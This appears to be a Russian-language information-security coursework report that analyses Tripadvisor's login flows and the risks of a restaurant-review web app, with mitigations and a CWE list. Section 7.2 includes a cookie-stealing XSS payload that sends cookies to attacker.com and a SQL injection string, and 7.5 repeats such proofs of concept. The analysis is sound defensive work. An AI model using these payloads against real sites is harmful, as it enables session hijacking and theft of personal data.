### Задание 1: Изучение форм авторизации и личного кабинета

**Исследование tripadvisor.ru:**

**Вход в личный кабинет:**
- URL страницы входа: `https://www.tripadvisor.ru/MemberLogin`
- Основной способ: Email + пароль
- Альтернатива: вход через социальные сети (Google, Facebook) - OAuth
- Кнопка "Войти" расположена в правом верхнем углу сайта
- После входа пользователь перенаправляется в личный кабинет

**Восстановление доступа:**
- На странице входа есть ссылка "Забыли пароль?"
- Процесс восстановления:
  1. Пользователь вводит email, связанный с учетной записью
  2. На email приходит письмо с инструкциями
  3. В письме содержится ссылка для сброса пароля (с токеном)
  4. После перехода по ссылке пользователь может установить новый пароль
- Токен имеет ограниченное время жизни (обычно 24 часа)

**Двухфакторная аутентификация (2FA):**
- Доступна в разделе "Настройки" → "Безопасность"
- Используется приложение-аутентификатор (Google Authenticator, Microsoft Authenticator)
- Требует ввода уникального кода при каждом входе
- Опциональная функция (пользователь может включить/выключить)

**Изменение данных в личном кабинете:**
- Доступ к настройкам: профиль (правый верхний угол) → "Account Settings" или "Account Info"
- Изменение email:
  - Раздел "Account Info" → поле email
  - Требуется подтверждение текущего пароля
  - Сохранение изменений
- Изменение пароля:
  - Раздел "Account Info" → опция смены пароля
  - Ввод текущего пароля → новый пароль → подтверждение нового пароля
  - Сохранение изменений
- Изменение профиля (имя, локация, фото):
  - Доступно без дополнительной аутентификации
  - Сохранение в разделе "Profile"

**Содержимое личного кабинета:**
- **Contributions/Reviews:** просмотр и управление отзывами и фотографиями
- **Bookings/Trips:** просмотр и управление бронированиями (отели, рестораны, экскурсии)
- **Saved Trips/Saved Places:** сохраненные поездки и закладки мест
- **Custom Itineraries:** пользовательские маршруты поездок
- **Trip Timeline:** временная шкала поездок
- **Privacy Settings:** настройки приватности и видимости данных
- **Notifications:** настройки уведомлений
- **Персонализированные рекомендации** на основе предпочтений пользователя

**Особенности безопасности:**
- Мониторинг активности аккаунта (рекомендуется регулярно проверять)
- Осторожность с подозрительными email о смене пароля
- Сильные пароли (рекомендуется: буквы, цифры, спецсимволы)

### Задание 3: Классификация рисков ИБ

**Категории рисков:**

1. **Регуляторные требования:**
   - Несоответствие 152-ФЗ (ПДн): неправильное хранение, обработка, передача ПДн
   - Нарушение требований к операторам ПДн
   - Отсутствие согласия на обработку ПДн
   - Недостаточное шифрование ПДн при передаче и хранении

2. **Утечки данных:**
   - SQL Injection → утечка БД с ПДн клиентов
   - Небезопасное хранение паролей (plaintext/hash без salt)
   - Утечка через EXIF метаданные в фотографиях (геолокация, устройство)
   - Недостаточная изоляция данных между пользователями

3. **Киберпреступления:**
   - Взлом личных кабинетов через брут-форс ОТП-кодов
   - XSS → кража сессий и несанкционированный доступ
   - Подмена ОТП-кодов через уязвимости в SMS-провайдере
   - Компрометация CMS → полный контроль над системой

### Задание 4: Анализ использования идентификационных данных и ОТП-кодов

**Риски ОТП-кодов:**

1. **Брут-форс атака:**
   - Отсутствие ограничений на количество попыток ввода кода
   - Автоматизированный перебор всех возможных комбинаций
   - Вектор реализации: простой (автоматизированный скрипт)
   - Время атаки: кратчайшее (минуты)

2. **Подмена/перехват SMS:**
   - Уязвимости в SMS-провайдере (SS7, SIM-swapping)
   - Перехват SMS через вредоносное ПО на устройстве
   - Социальная инженерия (фишинг)

3. **Абуз времени жизни:**
   - Слишком длительное время действия кода (более 10 минут)
   - Возможность повторного использования кода
   - Отсутствие одноразовости (код можно использовать несколько раз)

4. **Короткий/предсказуемый код:**
   - Менее 6 символов → легко подобрать (10^5 комбинаций для 5 цифр)
   - Последовательные номера (123456, 000000)
   - Использование небезопасного генератора случайных чисел

**Меры снижения рисков:**

1. **Rate limiting и блокировки:**
   - Максимум 3-5 попыток ввода ОТП
   - Блокировка на 15-30 минут после неудачных попыток
   - Ограничение генерации ОТП: максимум 3 запроса в 15 минут с одного номера/IP

2. **Время жизни и длина:**
   - Время жизни: 30-60 секунд (не более 5 минут)
   - Длина: минимум 6-8 цифр
   - Одноразовость: код удаляется после успешной или неудачной попытки

3. **Генерация кода:**
   - Криптографически стойкий генератор случайных чисел (CSPRNG)
   - Избегать предсказуемых паттернов
   - Хранение: salted hash вместо plaintext

4. **Дополнительные меры:**
   - Шифрование передачи (HTTPS/TLS)
   - Многофакторная аутентификация (MFA) в дополнение к SMS
   - Мониторинг подозрительной активности (множественные запросы с одного IP)

### Задание 7: Детальный анализ рисков и требований

#### 7.1. Возможные ошибки разработчиков

- SQL Injection: конкатенация строк в запросах
- XSS: отсутствие экранирования пользовательского ввода
- Небезопасное хранение паролей: plaintext или MD5
- Отсутствие валидации: выполнение кода из placeholder (инъекция)
- Недостаточная авторизация: проверка прав доступа

#### 7.2. Анализ возможности взлома, утечки, доступности информации

**Векторы атаки для ресторанного приложения:**

1. **SQL Injection через форму поиска/фильтров:**
   - Вектор: `/search?restaurant=admin' OR '1'='1`
   - Результат: полная компрометация БД с ПДн всех клиентов
   - Время атаки: минуты (автоматизированный эксплойт)
   - Простота реализации: высокая (готовые инструменты: sqlmap)

2. **XSS через форму отзыва:**
   - Вектор: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
   - Результат: кража сессий, несанкционированный доступ к ЛК, кража ПДн
   - Время атаки: секунды (выполнение в браузере жертвы)
   - Простота реализации: высокая (базовые знания JavaScript)

3. **Уязвимости CMS (WordPress/1C Битрикс/OpenCart):**
   - Вектор: эксплуатация известных CVE (RCE, privilege escalation)
   - Результат: полный контроль системы, доступ к БД, модификация кода
   - Время атаки: часы-дни (требуется исследование, разработка эксплойта)
   - Простота реализации: средняя (требуются знания эксплойтации)

4. **Брут-форс ОТП-кодов:**
   - Вектор: автоматизированный перебор 6-значных кодов
   - Результат: взлом аккаунтов, доступ к ПДн в ЛК
   - Время атаки: минуты (при отсутствии rate limiting)
   - Простота реализации: высокая (простой скрипт)

5. **Инъекция через placeholder (как указано в задании):**
   - Вектор: выполнение кода из placeholder в формах
   - Результат: RCE на сервере, полный контроль
   - Время атаки: минуты
   - Простота реализации: средняя (требуются знания серверных языков)

**Категории значимости информации:**

- **Критично:** ПДн клиентов (ФИО, телефон, email, паспортные данные для KYC)
- **Высоко:** данные бронирований (дата, время, количество гостей), платежная информация (номера карт, если хранятся)
- **Средне:** отзывы, рейтинги, метаданные фотографий (EXIF: геолокация, устройство)
- **Низко:** публичная информация о заведениях (название, адрес, меню)

#### 7.3. Требования ИБ

1. Валидация и санитизация всех пользовательских входных данных
2. Параметризованные SQL-запросы
3. Экранирование вывода (XSS защита)
4. Хеширование паролей (bcrypt/Argon2)
5. HTTPS для всех соединений
6. Шифрование ПДн в БД (AES-256)
7. Ограничения на ОТП-коды (время жизни, количество попыток)
8. Регулярные обновления CMS и зависимостей
9. Мониторинг и логирование доступа к ПДн
10. Резервное копирование с шифрованием

#### 7.4. Риски, меры снижения, уровень эффективности

| Риск | Мера снижения | Эффективность |
|------|---------------|---------------|
| SQL Injection | Параметризованные запросы | Высокая (95%) |
| XSS | Экранирование, CSP заголовки | Высокая (90%) |
| Брут-форс ОТП | Rate limiting, блокировка после 3 попыток | Высокая (85%) |
| Утечка ПДн | Шифрование БД, маскирование в UI | Средняя (70%) |
| Уязвимости CMS | Регулярные обновления, WAF | Средняя (60%) |

#### 7.5. Уязвимости (CWE)

1. **CWE-89: SQL Injection**
   - Причина: конкатенация строк в SQL-запросах
   - PoC: `/search?username=admin' OR '1'='1`
   - Контроль: параметризованные запросы, валидация входных данных

2. **CWE-79: Cross-site Scripting (XSS)**
   - Причина: отсутствие экранирования пользовательского ввода
   - PoC: `/echo?msg=<script>alert('XSS')</script>`
   - Контроль: экранирование (HTML entities), CSP заголовки

3. **CWE-434: Unrestricted Upload of File with Dangerous Type**
   - Причина: загрузка файлов без валидации типа и содержимого
   - PoC: загрузка PHP-файла через форму загрузки фото
   - Контроль: whitelist разрешенных типов, проверка MIME-type, сканирование на malware

#### 7.6. Принятые риски

- **Метаданные EXIF в фотографиях:** Риск утечки геолокации. Принят с контролем: автоматическое удаление EXIF при загрузке.
- **Использование готовой CMS:** Риск известных уязвимостей. Принят с контролем: регулярные обновления, WAF, мониторинг CVE.

#### 7.7. Контроли

- Автоматическое сканирование кода (SAST/SCA) в CI/CD
- Пентесты перед релизом
- Мониторинг логов доступа к ПДн
- Регулярные обновления CMS и зависимостей
- Аудит безопасности каждые 6 месяцев

#### 7.8. Критерии качества для разработчиков

- Все пользовательские данные валидируются и санитизируются
- SQL-запросы только параметризованные
- Пароли хешируются с salt (bcrypt)
- Все соединения через HTTPS
- Security headers настроены (CSP, X-Frame-Options)
- Код проходит SAST/SCA проверки без критичных уязвимостей

## Выводы

Для веб-приложения с отзывами о ресторанах критично обеспечить:
1. Защиту ПДн клиентов (шифрование, изоляция, минимизация)
2. Безопасность авторизации (ОТП с ограничениями, защита от брут-форса)
3. Защиту от основных векторов атак (SQL Injection, XSS, файловые инъекции)
4. Регулярные обновления CMS и мониторинг уязвимостей
5. Интеграцию инструментов AppSec в CI/CD конвейер

Приоритет: риски с простыми векторами реализации (SQL Injection, XSS) и кратчайшим временем атаки требуют немедленного устранения.
